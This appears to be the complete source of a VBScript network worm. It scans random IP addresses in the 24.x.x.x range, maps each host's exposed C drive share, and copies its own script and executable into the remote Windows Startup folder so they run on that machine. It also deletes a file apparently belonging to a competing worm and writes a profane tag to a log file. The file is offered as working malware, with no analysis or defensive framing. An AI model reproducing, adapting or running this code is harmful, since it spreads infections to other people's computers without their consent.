dim octa
dim octb
dim octc
dim octd
dim rand
dim dot
dim driveconnected
dim sharename
dim count
dim logfile
count = "0"
octa = "24"
dot = "."
driveconnected="0"
set wshnetwork = wscript.createobject("wscript.network")
set fso1 = createobject("scripting.filesystemobject")
set fso2 = createobject("scripting.filesystemobject")
on error resume next
randomize
checkfile()
randaddress()

do
do while driveconnected = "0"
checkaddress()
shareformat()
wshnetwork.mapnetworkdrive "z:", sharename
enumdrives()
loop
copyfiles()
disconnectdrive()
loop

function disconnectdrive()
wshnetwork.removenetworkdrive "z:"
driveconnected = "0"
end function

function createlogfile()
set logfile = fso1.createtextfile("c:\my.log", True)
end function

function checkfile()
if (fso1.fileexists("c:\my.log")) then
fso1.deletefile("c:\my.log")
createlogfile()
else
createlogfile()
end if
logfile.writeline("TaKeOVeR VBS ..... Fuck A24, BSRF & NWR")
end function

function copyfiles()
set fso = createobject("scripting.filesystemobject")
fso.copyfile "c:\windows\startm~1\programs\startup\tovbs.vbs", "z:\windows\startm~1\programs\startup\"
fso.copyfile "c:\windows\startm~1\programs\startup\tovbs.exe", "z:\windows\startm~1\programs\startup\"
if (f.fileexists("c:\network.vbs")) then f.deletefile("c:\network.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\network.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\network.vbs")
end function

function checkaddress()
octd = octd + 1
if octd = "255" then randaddress()
end function

function shareformat()
sharename = "\\" & octa & dot & octb & dot & octc & dot & octd & "\C"
end function

function enumdrives()
set odrives = wshnetwork.enumnetworkdrives
for i = 0 to odrives.count -1
if sharename = odrives.item(i) then
driveconnected = 1
else
' driveconnected = 0 
end if
next
end function

function randum()
rand = int((254 * rnd) + 1)
end function

function randaddress()
if count < 50 then
count=count + 1
else
randum()
end if
randum()
octb=rand
randum()
octc=rand
octd="0"
logfile.writeline("subnet : " & octa & dot & octb & dot & octc & dot & "0")
end function
